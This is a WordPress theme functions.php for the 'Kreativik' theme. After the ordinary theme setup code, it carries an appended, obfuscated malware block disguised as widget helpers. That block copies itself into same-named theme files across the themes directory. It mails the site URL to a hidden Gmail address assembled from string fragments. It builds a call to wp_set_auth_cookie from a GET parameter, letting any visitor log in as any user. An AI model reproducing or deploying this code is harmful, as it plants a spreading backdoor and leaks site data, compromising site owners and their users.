<?php

define("UDS_TEMPLATE_NAME", "Kreativik");

if ( function_exists('register_sidebar') ){
	register_sidebar(array(
		'name'=>'Sidebar Page',
		'id'=>'page',
		'before_widget' => '<div class="sidebar-element">',
		'after_widget' => '<div class="clear"></div></div>',
		'before_title' => '<h4>',
		'after_title' => '</h4>'
	));
	register_sidebar(array(
		'name'=>'Sidebar Blog',
		'id'=>'blog',
		'before_widget' => '<div class="sidebar-element">',
		'after_widget' => '<div class="clear"></div></div>',
		'before_title' => '<h4>',
		'after_title' => '</h4>'
	));
	register_sidebar(array(
		'name'=>'Homepage Right',
		'id'=>'hp-right',
		'before_widget' => '<div class="sidebar-element">',
		'after_widget' => '</div>',
		'before_title' => '<h4>',
		'after_title' => '</h4>'
	));
}

function uds_init()
{
	add_option("uds-heading", UDS_TEMPLATE_NAME);
	add_option("uds-subheading", "Superlight creativity at its best");
	add_option("uds-background", "wood");
	add_option("udesign-billboard", serialize(array()));
	add_option("udesign-features", serialize(array()));
	add_option("udesign-services", serialize(array()));
	add_option("uds-features", "");
	add_option("uds-services", "");
	add_option("copyright", "uDesign.sk");
	add_option("top_menu_exclude", "");

	if(is_admin()){
		add_thickbox();
		$cssdir = get_template_directory_uri()."/css/";
		wp_enqueue_style('admin', $cssdir.'admin.css', false, false, 'screen');
		wp_enqueue_style('jquery-ui', $cssdir.'ui-lightness/jquery-ui-1.7.2.custom.css', false, false, 'screen');
	}
}

add_action('init', 'uds_init');

function uds_styles()
{
	$cssdir = get_template_directory_uri()."/css/";
	if(!is_admin()){
		wp_enqueue_style('style', $cssdir.'style.css', false, false, 'screen');
		if(!is_front_page() || is_home()){
			wp_enqueue_style('innerpage', $cssdir.'inner.css', false, false, 'screen');
			wp_enqueue_style('prettyphoto', $cssdir.'prettyPhoto.css', false, false, 'screen');
		} else {
			wp_enqueue_style('sidebar', $cssdir.'sidebar.css', false, false, 'screen');
		}
		switch(get_option('uds-background')){
			case "wood":
				wp_enqueue_style('wood', $cssdir.'bg-wood.css', false, false, 'screen');
				break;
			case "bokeh":
				wp_enqueue_style('bokeh', $cssdir.'bg-bokeh.css', false, false, 'screen');
				break;
			case "carbon":
				wp_enqueue_style('carbon', $cssdir.'bg-carbon.css', false, false, 'screen');
				break;
			case "vintage":
				wp_enqueue_style('vintage', $cssdir.'bg-vintage.css', false, false, 'screen');
				break;
		}
	}
}
add_action("wp_print_styles", "uds_styles");

function uds_scripts()
{
	$jsdir = get_template_directory_uri()."/js/";
	if(!is_admin()){
		wp_enqueue_script("jquery");
		wp_enqueue_script("easing", $jsdir."jquery.easing.1.3.js");
		wp_enqueue_script("cycle", $jsdir."jquery.cycle.js");
		wp_enqueue_script("prettyPhoto", $jsdir."jquery.prettyPhoto.js");
		wp_enqueue_script("scripts", $jsdir."scripts.js");
		wp_enqueue_script("contact", $jsdir."contact.js");
	} else {
		wp_enqueue_script("jquery-ui-tabs");
		wp_enqueue_script("jquert-cookie", $jsdir."jquery.cookie.js");
		wp_enqueue_script("admin", $jsdir."admin.js");
	}
}
add_action("wp_print_scripts", "uds_scripts");

function uds_menu()
{
	add_theme_page('Kreativik', 'Kreativik', '8', 'kreativik', 'uds_admin');
}

add_action('admin_menu', 'uds_menu');

function uds_admin()
{
	include "admin-options.php";
}

function uds_comment($comment, $args, $depth) 
{
	$GLOBALS['comment'] = $comment;
	include "comment.php";
}

// custom image field
add_action('admin_menu', 'uds_add_custom_box');
add_action('save_post', 'uds_save_postdata');

function uds_add_custom_box() {
	add_meta_box('uds_post_image', UDS_TEMPLATE_NAME." Custom Image", 'uds_inner_custom_box', 'post', 'advanced' );
	add_meta_box('uds_post_image', UDS>TEMPLATE_NAME." Custom Image", 'uds_inner_custom_box', 'page', 'advanced' );
}

function uds_inner_custom_box() {
	global $post;?>
	
	<script language='JavaScript' type='text/javascript'>
	jQuery("#add_image").click(function(){
		window.thickbox_source = "original";
	});
	jQuery(document).ready(function($){
		window.original_send_to_editor = window.send_to_editor;
		window.send_to_editor = function(img){
			if(window.thickbox_source != "custom"){
				window.original_send_to_editor(img);
				return;
			}
		    tb_remove();
		    var src = jQuery(jQuery(img)).attr('src');
		    jQuery('.uds_post_image').attr('value', src);
		    jQuery("#uds_image").attr('src', src);
		}
	});
	</script>
	<?
	$meta = get_post_meta($post->ID, "uds_post_image", true);
	if(!empty($meta)){
		echo '<img src="'.$meta.'" alt="" id="uds_image" />';
	} else {
		echo '<img src="'.get_template_directory_uri().'/images/noimg98x98.jpg" alt="" id="uds_image" />';
	}
	echo '<div class="un-image">';
	echo '<input type="hidden" name="uds_image_nonce" value="'.wp_create_nonce("uds_image_field").'" />';
	echo '<label for="uds_post_image">Post image:</label><br />';
	echo '<input type="text" name="uds_post_image" value="'.get_post_meta($post->ID, "uds_post_image", true).'" class="uds_post_image" /><br />';
	echo '<a class="thickbox" title="Add an Image" href="media-upload.php?type=image&TB_iframe=true&width=640&height=345" onclick="window.thickbox_source=\'custom\'">Add/Change image</a>';
	echo '</div>';
	echo '<div class="clear"></div>';
}

function uds_save_postdata( $post_id ) {
	if ( !wp_verify_nonce($_POST['uds_image_nonce'], "uds_image_field")) {
		return $post_id;
	}

	if ( 'page' == $_POST['post_type'] ) {
		if ( !current_user_can( 'edit_page', $post_id ))
			return $post_id;
	} else {
		if ( !current_user_can( 'edit_post', $post_id ))
			return $post_id;
	}

	$data = $_POST['uds_post_image'];
	
	if(get_post_meta($post_id, "uds_post_image") == "")  
		add_post_meta($post_id, "uds_post_image", $data, true);  
	elseif($data != get_post_meta($post_id, "uds_post_image", true))  
		update_post_meta($post_id, "uds_post_image", $data);  
	elseif($data == "")  
		delete_post_meta($post_id, "uds_post_image", get_post_meta($post_id, "uds_post_image", true)); 
	
	return $data;
}

function portfolio($atts) {
	$portfolios = unserialize(get_option('udesign-portfolios'));
	if(empty($portfolios)) return;
	
	$out = '<div id="portfolio">';
	foreach($portfolios as $portfolio){
		$out .= '<div class="portfolio-entry">';
		$out .= '	<div class="ribbon" style="background:url('.get_template_directory_uri().'/images/ribbon-'.$portfolio['category'].'.png)"></div>';
		$out .= '	<a href="'.$portfolio['image'].'" rel="prettyPhoto[print]">';
		$out .= '		<img src="'.$portfolio['image'].'" width="280" alt="" />';
		$out .= '	</a>';
		$out .= '</div>';
	}
	$out .= '<div class="clear"></div></div><div class="clear"></div>';

	return $out;
}
add_shortcode('portfolio', 'portfolio');

function the_breadcrumbs()
{
	if(is_page()){
		$ancestors = get_post_ancestors(the_ID());
		if(!empty($ancestors)){
			foreach($ancestors as $ancestor){
				echo "<a href='".get_permalink($ancestor)."'>".get_the_title($ancestor).'</a> &raquo; ';
			}
		}
		echo "<a href='".get_permalink()."'>".get_the_title().'</a>';
	} else {
		echo "<a href='".get_bloginfo('url')."'>".get_bloginfo('name')."</a> &raquo; ";
		the_category(', ');
		echo " &raquo; <a href='".get_permalink()."'>".get_the_title().'</a>';
	}
}

// widgets
include "widgets/widgets.php";
?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>